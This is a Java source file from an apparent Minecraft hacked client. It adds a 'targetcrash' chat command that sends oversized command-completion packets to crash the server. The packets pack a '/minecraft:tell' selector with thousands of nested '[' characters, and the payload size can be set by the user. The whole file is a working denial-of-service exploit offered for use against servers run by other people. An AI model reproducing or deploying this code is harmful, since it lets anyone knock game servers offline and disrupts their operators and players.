package net.como.client.commands.impl;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.como.client.ComoClient;
import net.como.client.commands.Command;
import net.como.client.utils.ChatUtils;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

public class CommandTargetCrash extends Command {
    private static final int PACKET_AMOUNT = 2; // I found that it works best if you send 2 packets

    public CommandTargetCrash() {
        super("targetcrash", "Crashes the server by Mojang being idiots and not testing for extreme data. Laugh at this user.", "tellcrash", "tc");
    }

    private class CrashThread extends Thread {
        private final int payloadSize;

        public CrashThread(int payloadSize) {
            this.payloadSize = payloadSize;
        }

        @Override
        public void run() {
            // Create the comically large string
            String command = "/minecraft:tell @e[nbt={a:";
            command += "[".repeat(payloadSize - command.length());

            // Send it in a packet but with a delay
            for (int i = 0; i < PACKET_AMOUNT; i++) {
                if (ComoClient.getInstance().me() == null) return;

                ComoClient.getInstance().getClient().getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(69420, command));

                // Wait 500ms
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private void sendPayload(int payloadSize) {
        // Create the thread
        Thread thread = new CrashThread(payloadSize);

        // Start the thread
        thread.start();
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(argument("payload", IntegerArgumentType.integer(1, 32500)).executes(context -> {
            int payloadSize = IntegerArgumentType.getInteger(context, "payload");
            sendPayload(payloadSize);
            ChatUtils.info("Sent payload of size " + payloadSize);
            return 1;
        }));

        builder.executes(context -> {
            sendPayload(2020); // This is what the original code had
            ChatUtils.info("Sent payload.");
            return 1;
        });
    }
}
